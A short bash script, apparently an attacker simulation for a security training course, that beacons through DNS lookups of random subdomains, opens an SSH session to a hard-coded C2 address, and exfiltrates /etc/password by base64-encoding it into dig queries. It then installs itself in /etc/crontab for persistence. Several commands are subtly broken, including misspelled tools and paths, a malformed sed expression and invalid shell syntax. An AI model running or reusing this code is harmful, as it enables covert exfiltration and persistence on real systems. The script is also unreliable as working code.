#!/bin/bash

#add to the attacker ngnix 
#attacker will host the script and will have a sg that allows anly the backect to pull the file
#
#
#dig errtr.zina.com
#dig fjhdfhj.zina.com * 10
#
#
#sleep
#
#ssh command to the c2service
#
#simhash
#
#
#cat /etc/password | base64b -w5 | sed '/\n/.zina.com\n' | xargs dig @1.1
#
#change /etc/cronab file
#


FILE=$(realpath ${0})


for i in {1..10}
do
	rand=$(echo $RANDOM | md5sum | awk '{print $1}')
	dig ${rand}.artifex.co.il
	sleep 10
done

sleep 300

ssh -i ~/.ssh/keys/snowbit_course 54.74.74.195

sleep 250

cat /etc/password | base64b -w5 | sed '/\n/.artifactory.com\n' | xargs dig @1.1

is_cron_updated=$(echo /etc/crtontab | grep "${FILE}" | wc -l)
if ${is_cron_updated}==0; then
	"* * * * ${FILE}" >> /etc/crontab
fi